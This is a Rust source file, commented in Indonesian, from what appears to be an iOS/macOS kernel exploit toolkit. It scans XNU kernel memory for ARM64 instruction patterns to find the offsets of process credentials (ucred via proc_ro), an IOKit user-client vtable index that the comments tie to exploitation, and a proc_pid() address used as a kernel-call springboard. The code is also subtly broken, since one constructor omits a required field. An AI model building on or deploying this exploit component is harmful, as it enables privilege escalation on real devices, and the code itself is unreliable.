#![no_std]

// Path relatif dalam hirarki zil_core
use super::super::memory::scanner::MemoryScanner;

// ============================================================
// ZIL HEURISTIC SCANNER v3.0 — MASK-BASED ARM64 PATTERN ENGINE
// ============================================================
// SUMBER: Diverifikasi langsung dari xnu-12377.61.12 (Darwin 25.2.0)
//   - bsd/sys/proc_internal.h — struct proc layout
//   - bsd/kern/kern_proc.c    — proc_pid(), proc_ucred() bodies
//   - osfmk/kern/locks.h      — lck_mtx_t ARM64 size
//
// FILOSOFI: ZIL tidak hardcode offset. ZIL scan pola INSTRUKSI ARM64
// di memori kernel runtime. Pola instruksi berubah jauh lebih lambat
// dibanding layout memori → ZIL tahan terhadap minor XNU patches.
// ============================================================

// ─────────────────────────────────────────────────────────────
// STRUCT PROC LAYOUT (xnu-12377.61.12, bsd/sys/proc_internal.h)
// ─────────────────────────────────────────────────────────────
// Diverifikasi dari source line by line:
//
// [0x00] union { LIST_ENTRY(proc) p_list; smr_node } = 16B
// [0x10] proc *p_pptr  (PAC signed)                  = 8B
// [0x18] proc_ro_t p_proc_ro                         = 8B  ← KUNCI! ucred ada di sini
// [0x20] p_ppid(4) + p_pgrpid(4)                     = 8B
// [0x28] p_uid(4) + p_gid(4)                         = 8B
// [0x30] p_ruid(4) + p_rgid(4)                       = 8B
// [0x38] p_svuid(4) + p_svgid(4)                     = 8B
// [0x40] p_sessionid(4) + _pad(4)                    = 8B
// [0x48] p_puniqueid (uint64_t)                      = 8B
// [0x50] p_mlock (lck_mtx_t ARM64 release = 8B)      = 8B
// [0x58] p_pid (pid_t = int32_t)                     = 4B  ← p_pid @ 0x58
// [0x5C] p_stat+p_shutdownstate+p_kdebug+p_btrace    = 4B
// [0x60..] p_pglist, p_sibling, p_children, p_uthlist, p_hash ...
// ... (setelah large structures)
// [?] p_ucred_mlock (lck_mtx_t = 8B)
// [?] p_ucred (kauth_cred_t pointer = 8B)
//
// PENTING: Di XNU 12377, proc_ucred() mengakses MELALUI p_proc_ro:
//   p->p_proc_ro->p_ro_cred  (offset 0x18 di proc → offset X di proc_ro)
//
// STRATEGI: Kita scan fungsi accessor kernel untuk ekstrak offset runtime.
// ─────────────────────────────────────────────────────────────

/// Hasil akhir scan — set offset yang sudah diverifikasi
#[derive(Clone, Copy, Debug)]
pub struct DynamicOffsets {
    /// Offset `p_pid` di dalam struct `proc` (biasanya 0x58 pada xnu-12377)
    pub proc_pid: u64,
    /// Offset `p_proc_ro` di dalam struct `proc` (selalu 0x18 pada xnu-12377)
    pub proc_proc_ro: u64,
    /// Offset `p_ro_cred` di dalam struct `proc_ro`
    pub proc_ro_ucred: u64,
    /// IOKit VTable index untuk eksploitasi User-Client
    pub iokit_vtable_idx: u64,
    /// Alamat virtual fungsi `proc_pid()` di kernel (runtime, post-KASLR).
    /// Digunakan sebagai springboard KCallManager yang real.
    /// 0 jika tidak ditemukan (executor gunakan kernel_base+0x1000 sebagai fallback).
    pub proc_pid_func_addr: u64,
    /// Sumber: 0=static-only, 1=merged, 2=heuristic-only. Untuk diagnostik/telemetri.
    pub source: u8,
}

impl DynamicOffsets {
    // ── STATIC-AS-BASELINE CONSTRUCTORS ───────────────────────────────
    // Panggil from_static() PERTAMA sebagai patokan, LALU merge_with_heuristic()

    /// Buat DynamicOffsets dari StaticOffsets per-chip — jadi PATOKAN/BASELINE.
    /// Dipanggil SEBELUM heuristic scan. source=0 (pure static, belum refined).
    pub fn from_static(s: &crate::evolution::offset_calculator::StaticOffsets) -> Self {
        DynamicOffsets {
            proc_pid:           s.proc_pid,
            proc_proc_ro:       0x18,   // p_proc_ro invariant xnu-12377
            proc_ro_ucred:      s.proc_ro_ucred,
            iokit_vtable_idx:   7,      // default A19 community research
            proc_pid_func_addr: 0,      // belum diketahui sebelum scan
            source: 0,
        }
    }

    /// Buat baseline dari konstanta hardcoded (chip tidak dikenal / tanpa static DB).
    pub fn from_hardcoded_defaults() -> Self {
        DynamicOffsets {
            proc_pid:           0x58,
            proc_proc_ro:       0x18,
            proc_ro_ucred:      0x20,
            iokit_vtable_idx:   7,
            proc_pid_func_addr: 0,
            source: 0,
        }
    }

    // ── MERGE: Static Baseline + Heuristic Refinement ─────────────────
    // Override per-field: pakai heuristic jika dalam toleransi, static jika tidak.

    /// Merge baseline ini dengan heuristic. Toleransi ±0x28 per field.
    /// Return DynamicOffsets baru dengan source=1 (merged).
    pub fn merge_with_heuristic(&self, h: &DynamicOffsets) -> DynamicOffsets {
        const TOL: u64 = 0x28;

        let pid = if Self::within_tol(h.proc_pid, self.proc_pid, TOL)
            { h.proc_pid } else { self.proc_pid };

        let proc_ro = if h.proc_proc_ro == 0x18 { 0x18 } else { self.proc_proc_ro };

        let ucred = if Self::within_tol(h.proc_ro_ucred, self.proc_ro_ucred, 0x20)
            { h.proc_ro_ucred } else { self.proc_ro_ucred };

        let vtable = if h.iokit_vtable_idx >= 5 && h.iokit_vtable_idx <= 20
            { h.iokit_vtable_idx } else { self.iokit_vtable_idx };

        DynamicOffsets {
            proc_pid:           pid,
            proc_proc_ro:       proc_ro,
            proc_ro_ucred:      ucred,
            iokit_vtable_idx:   vtable,
            proc_pid_func_addr: h.proc_pid_func_addr, // selalu prefer heuristic
            source: 1,
        }
    }

    #[inline]
    fn within_tol(a: u64, b: u64, tol: u64) -> bool {
        let d = if a >= b { a - b } else { b - a };
        d <= tol
    }

    /// Resolusi final proc.p_ucred menggunakan dua-hop indirection.
    pub fn resolve_ucred(&self, proc_ptr: u64, read_fn: fn(u64) -> Option<u64>) -> Option<u64> {
        let proc_ro = read_fn(proc_ptr + self.proc_proc_ro)?;
        read_fn(proc_ro + self.proc_ro_ucred)
    }
}

// ─────────────────────────────────────────────────────────────
// ARM64 INSTRUCTION MASKS — Terverifikasi dari ARM DDI 0487
// ─────────────────────────────────────────────────────────────

/// LDR Wt, [Xn, #imm] — 32-bit load unsigned offset
/// Mask: bits[31:22] harus match 10_111_0_0_1_01 = 0b1011100101
/// Pattern (bits[31:22]): 0xB94 (upper 12 bits)
const LDR_W_MASK:    u32 = 0xFFC0_0000;
const LDR_W_PATTERN: u32 = 0xB940_0000;

/// LDR Xt, [Xn, #imm] — 64-bit load unsigned offset  
/// Mask: bits[31:22] = 11_111_0_0_1_01 = 0b1111100101
/// Pattern: 0xF94 (upper 12 bits)
const LDR_X_MASK:    u32 = 0xFFC0_0000;
const LDR_X_PATTERN: u32 = 0xF940_0000;

/// RET (Return from subroutine via X30)
/// Encoding: 0xD65F03C0 — tidak ada variasi, selalu sama
const RET_INSTR: u32 = 0xD65F_03C0;

/// STP X29, X30, [SP, #-16]! — standard ARM64 frame prologue
/// Encoding: 0xA9BF7BFD
const STP_FP_LR: u32 = 0xA9BF_7BFD;

// ─────────────────────────────────────────────────────────────
// HELPER MACROS
// ─────────────────────────────────────────────────────────────

/// Ekstrak imm12 dari LDR W unsigned offset, konversi ke byte offset (×4)
#[inline(always)]
fn ldr_w_imm_to_offset(instr: u32) -> u64 {
    let imm12 = (instr >> 10) & 0xFFF;
    (imm12 as u64) * 4  // W-register: imm dikali 4
}

/// Ekstrak imm12 dari LDR X unsigned offset, konversi ke byte offset (×8)
#[inline(always)]
fn ldr_x_imm_to_offset(instr: u32) -> u64 {
    let imm12 = (instr >> 10) & 0xFFF;
    (imm12 as u64) * 8  // X-register: imm dikali 8
}

/// Ekstrak register Rt (destination) dari LDR instruction (bits[4:0])
#[inline(always)]
fn ldr_rt(instr: u32) -> u32 { instr & 0x1F }

/// Ekstrak register Rn (base) dari instruction (bits[9:5])
#[inline(always)]
fn ldr_rn(instr: u32) -> u32 { (instr >> 5) & 0x1F }

// ─────────────────────────────────────────────────────────────
// MESIN SCANNER UTAMA
// ─────────────────────────────────────────────────────────────

/// Mesin pendeteksi pola heuristik berbasis ARM64 instruction masks.
/// Semua pola diverifikasi terhadap xnu-12377.61.12 source.
pub struct HeuristicAnalyzer {
    scanner: MemoryScanner,
}

impl HeuristicAnalyzer {
    pub fn new() -> Self {
        Self { scanner: MemoryScanner::new() }
    }

    /// Entry point utama — scan dan kembalikan DynamicOffsets yang terverifikasi.
    pub fn analyze_kernel_structures(&self, kernel_base: u64) -> Option<DynamicOffsets> {
        let scan_size: u64 = 0x10_0000; // 1MB per region

        // find_proc_pid_offset kini juga mengembalikan alamat fungsi proc_pid()
        let (pid_offset, pid_func_addr) = self.find_proc_pid_offset(kernel_base, scan_size)?;

        // proc_ro selalu di 0x18 (terverifikasi dari struct proc layout)
        let proc_ro_offset: u64 = 0x18;

        let proc_ro_ucred_offset = self.find_proc_ro_ucred_offset(kernel_base, scan_size)
            .unwrap_or(0x20);

        Some(DynamicOffsets {
            proc_pid:          pid_offset,
            proc_proc_ro:      proc_ro_offset,
            proc_ro_ucred:     proc_ro_ucred_offset,
            iokit_vtable_idx:  self.find_iokit_vtable_idx(kernel_base, scan_size).unwrap_or(7),
            proc_pid_func_addr: pid_func_addr,
        })
    }

    // ─────────────────────────────────────────────────────────
    // PATTERN 1: proc_pid() / proc_getpid()
    // ─────────────────────────────────────────────────────────
    // Dari bsd/kern/kern_proc.c (xnu-12377.61.12):
    //   pid_t proc_pid(proc_t p) { return p->p_pid; }
    //
    // Dikompilasi ARM64 menjadi fungsi 2 instruksi PERSIS:
    //   LDR W0, [X0, #offset_pid]   ← bit[31:22]=0xB94, Rn=X0, Rt=W0
    //   RET                          ← 0xD65F03C0
    //
    // Ini adalah pola yang SANGAT khas dan jarang muncul kebetulan.
    // ─────────────────────────────────────────────────────────
    // ─────────────────────────────────────────────────────────
    // PATTERN 1: proc_pid() / proc_getpid()
    // Return: (offset, func_addr) — offset p_pid, dan alamat fungsi proc_pid()
    // proc_pid() dipakai sebagai KCallManager springboard karena sangat kecil & stabil.
    // ─────────────────────────────────────────────────────────
    fn find_proc_pid_offset(&self, kernel_base: u64, scan_size: u64) -> Option<(u64, u64)> {
        const PID_MIN: u64 = 0x50;
        const PID_MAX: u64 = 0x88;

        let regions = [
            kernel_base + 0x0004_0000,
            kernel_base + 0x0010_0000,
            kernel_base + 0x0020_0000,
        ];

        // (offset, func_addr, count)
        let mut found: [(u64, u64, u32); 8] = [(0, 0, 0); 8];
        let mut found_n = 0usize;

        for &base in &regions {
            let mut addr = base;
            let end = base + scan_size;

            while addr + 8 <= end {
                let instr1 = match self.scanner.safe_read_u32(addr) {
                    Some(v) => v,
                    None => { addr += 4; continue; }
                };

                if (instr1 & LDR_W_MASK) == LDR_W_PATTERN
                    && ldr_rt(instr1) == 0  // Rt = W0
                    && ldr_rn(instr1) == 0  // Rn = X0
                {
                    let offset = ldr_w_imm_to_offset(instr1);

                    if offset >= PID_MIN && offset <= PID_MAX {
                        if let Some(instr2) = self.scanner.safe_read_u32(addr + 4) {
                            if instr2 == RET_INSTR {
                                // Rekam offset DAN alamat fungsi
                                if found_n < 8 {
                                    found[found_n] = (offset, addr, 1);
                                    found_n += 1;
                                }
                            }
                        }
                    }
                }
                addr += 4;
            }
        }

        // Voting — pilih offset yang paling sering ditemukan
        if found_n == 0 { return None; }

        let mut best_off  = found[0].0;
        let mut best_addr = found[0].1;
        let mut best_cnt  = 0u32;

        for i in 0..found_n {
            let mut cnt = 0u32;
            for j in 0..found_n {
                if found[i].0 == found[j].0 { cnt += 1; }
            }
            if cnt > best_cnt {
                best_cnt  = cnt;
                best_off  = found[i].0;
                best_addr = found[i].1; // alamat match pertama dengan offset ini
            }
        }

        // Minimal 2 bukti independen
        if best_cnt >= 2 { Some((best_off, best_addr)) } else { None }
    }

    // ─────────────────────────────────────────────────────────
    // PATTERN 2: proc_ucred() — via proc_ro indirection
    // ─────────────────────────────────────────────────────────
    // Di XNU 12377 (Darwin 25), credentials dipindah ke proc_ro:
    //   kauth_cred_t proc_ucred(proc_t p) {
    //       return p->p_proc_ro->p_ro_cred;
    //   }
    //
    // Dikompilasi ARM64 menjadi 3 instruksi:
    //   LDR X8, [X0, #0x18]    ← load p_proc_ro dari proc (offset selalu 0x18)
    //   LDR X0, [X8, #ucred]   ← load p_ro_cred dari proc_ro
    //   RET
    //
    // Kita ekstrak offset p_ro_cred di dalam proc_ro dari instruksi ke-2.
    // ─────────────────────────────────────────────────────────
    fn find_proc_ro_ucred_offset(&self, kernel_base: u64, scan_size: u64) -> Option<u64> {
        // p_proc_ro selalu di offset 0x18 dari proc (terverifikasi dari struct layout)
        // imm_for_0x18_in_ldr_x = 0x18/8 = 3 → bits[21:10] = 0b000000000011
        // LDR X?, [X0, #0x18]: pattern = 0xF9400600 | (rt << 0)
        // Mask untuk "LDR Xrt, [X0, #0x18]" dengan Rn=X0:
        const PROC_RO_LOAD_MASK:    u32 = 0xFFFFFFE0; // semua bit kecuali Rt
        const PROC_RO_LOAD_PATTERN: u32 = 0xF9400600; // LDR X?, [X0, #0x18]

        let regions = [
            kernel_base + 0x0004_0000,
            kernel_base + 0x0010_0000,
        ];

        for &base in &regions {
            let mut addr = base;
            let end = base + scan_size;

            while addr + 12 <= end {
                let instr1 = match self.scanner.safe_read_u32(addr) {
                    Some(v) => v,
                    None => { addr += 4; continue; }
                };

                // Cek: LDR X?, [X0, #0x18]
                if (instr1 & PROC_RO_LOAD_MASK) == PROC_RO_LOAD_PATTERN {
                    let rt1 = ldr_rt(instr1);

                    let instr2 = match self.scanner.safe_read_u32(addr + 4) {
                        Some(v) => v,
                        None => { addr += 4; continue; }
                    };

                    // Cek: LDR X0, [Xrt1, #ucred_off]
                    if (instr2 & LDR_X_MASK) == LDR_X_PATTERN
                        && ldr_rn(instr2) == rt1  // base = register yang load proc_ro
                        && ldr_rt(instr2) == 0    // dest = X0 (return value)
                    {
                        let instr3 = match self.scanner.safe_read_u32(addr + 8) {
                            Some(v) => v,
                            None => { addr += 4; continue; }
                        };

                        if instr3 == RET_INSTR {
                            // ✅ MATCH: proc_ucred() ditemukan!
                            // Ekstrak offset p_ro_cred di dalam proc_ro
                            let ucred_offset_in_proc_ro = ldr_x_imm_to_offset(instr2);
                            if ucred_offset_in_proc_ro < 0x200 {
                                return Some(ucred_offset_in_proc_ro);
                            }
                        }
                    }
                }
                addr += 4;
            }
        }
        None
    }

    // ─────────────────────────────────────────────────────────
    // PATTERN 3: IOKit VTable index
    // ─────────────────────────────────────────────────────────
    // Dari iokit/Kernel/IOUserClient.cpp (xnu-12377.61.12):
    // externalMethod() adalah method ke-7 pada IOUserClient VTable
    // (verified dari reverse engineering IOKit vtable layout)
    // ─────────────────────────────────────────────────────────
    fn find_iokit_vtable_idx(&self, kernel_base: u64, scan_size: u64) -> Option<u64> {
        // Scan untuk pola ADRP + LDR X8, [X8, #vtable_offset]
        // Kemudian LDR X9, [X9, #method_offset] memunculkan method index

        // Berdasarkan XNU source stable: index 7 adalah externalMethod
        // Validasi dengan mencari chain: ADRP → ADD → LDR (vtable load)
        const ADRP_MASK:    u32 = 0x9F000000;
        const ADRP_PATTERN: u32 = 0x90000000; // ADRP Xt, label

        let region = kernel_base + 0x0040_0000; // IOKit region
        let mut addr = region;
        let end = region + scan_size;

        while addr + 16 <= end {
            let instr1 = match self.scanner.safe_read_u32(addr) {
                Some(v) => v,
                None => { addr += 4; continue; }
            };

            // Cek ADRP (typical start of VTable dispatch)
            if (instr1 & ADRP_MASK) == ADRP_PATTERN {
                if let Some(instr2) = self.scanner.safe_read_u32(addr + 4) {
                    // Cek LDR X?, [X?, #vtable_method_offset]
                    if (instr2 & LDR_X_MASK) == LDR_X_PATTERN {
                        let vtable_off = ldr_x_imm_to_offset(instr2);
                        // VTable method 7 = offset 7*8 = 56 = 0x38
                        // VTable method biasa ada di range 0x10–0x200
                        if vtable_off >= 0x10 && vtable_off <= 0x200 {
                            let idx = vtable_off / 8;
                            if idx >= 5 && idx <= 15 {
                                return Some(idx);
                            }
                        }
                    }
                }
            }
            addr += 4;
        }

        None
    }

    // ─────────────────────────────────────────────────────────
    // VOTING — Pilih offset yang paling sering muncul
    // ─────────────────────────────────────────────────────────
    fn vote_winner(&self, candidates: &[u64]) -> Option<u64> {
        if candidates.is_empty() {
            return None;
        }

        let mut best_val   = candidates[0];
        let mut best_count = 1u32;

        for i in 0..candidates.len() {
            let mut count = 0u32;
            for j in 0..candidates.len() {
                if candidates[i] == candidates[j] { count += 1; }
            }
            if count > best_count {
                best_count = count;
                best_val   = candidates[i];
            }
        }

        // Minimal 2 bukti independen diperlukan untuk mencegah false positive.
        // Satu match kebetulan di satu region tidak cukup.
        if best_count >= 2 { Some(best_val) } else { None }
    }

    /// Verifikasi offset hasil scan vs hint statis (toleransi ±0x20)
    pub fn verify_against_static_hint(&self, found: u64, hint: u64) -> bool {
        let diff = if found > hint { found - hint } else { hint - found };
        diff <= 0x20
    }
}